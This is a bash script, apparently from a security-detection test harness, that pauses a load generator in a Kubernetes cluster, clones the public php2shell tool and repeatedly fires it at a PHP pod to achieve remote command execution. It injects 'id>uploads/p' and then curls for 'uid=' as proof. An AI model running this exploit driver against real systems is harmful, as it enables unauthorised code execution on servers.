#!/usr/bin/env bash
# The real run for this example: the sealed proof of concept against the bound pod. Writes the window to out/real-from and out/real-to.
set -uo pipefail
COMMAND="${COMMAND:-id>uploads/p}"
kubectl -n php2shell-loadgen scale deployment/loadgen --replicas=0
kubectl -n php2shell-loadgen wait --for=delete pod -l app=loadgen --timeout=120s || true
sleep 10
POD=$(kubectl -n php2shell get pod -l app=php2shell --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')
POD_IP=$(kubectl -n php2shell get pod "$POD" -o jsonpath='{.status.podIP}')
echo "target pod=$POD ip=$POD_IP"
WORK=/tmp/php2shell-poc
mkdir -p "$WORK"
[ -d "$WORK/src" ] || git clone --depth 1 https://github.com/devploit/php2shell "$WORK/src"
[ -f "$WORK/src/requirements.txt" ] && python3 -m pip install --user -r "$WORK/src/requirements.txt" || true
date -u +%FT%TZ > out/real-from
landed=0
for try in $(seq 1 "${ATTEMPTS:-8}"); do
  echo "================= pass $try ================="
  bash pkg/attack/php2shell/private/run-php2shell.sh "http://$POD_IP/index.php" "$COMMAND" "$WORK" || true
  proof=$(curl -s -m 10 "http://$POD_IP/${COMMAND##*>}" || true)
  if printf '%s' "$proof" | grep -q 'uid='; then echo "landed on pass $try: $proof"; landed=1; break; fi
done
sleep 30
date -u +%FT%TZ > out/real-to
sleep 20
kubectl -n php2shell-loadgen scale deployment/loadgen --replicas=1 || true
mkdir -p out/php2shell
if [ "$landed" = 1 ]; then echo "landed: $proof" > out/php2shell/real-result.txt; else echo "did not land in ${ATTEMPTS:-8} passes; nothing can be concluded from this run" > out/php2shell/real-result.txt; echo "::warning::the real run did not land"; fi
cat out/php2shell/real-result.txt
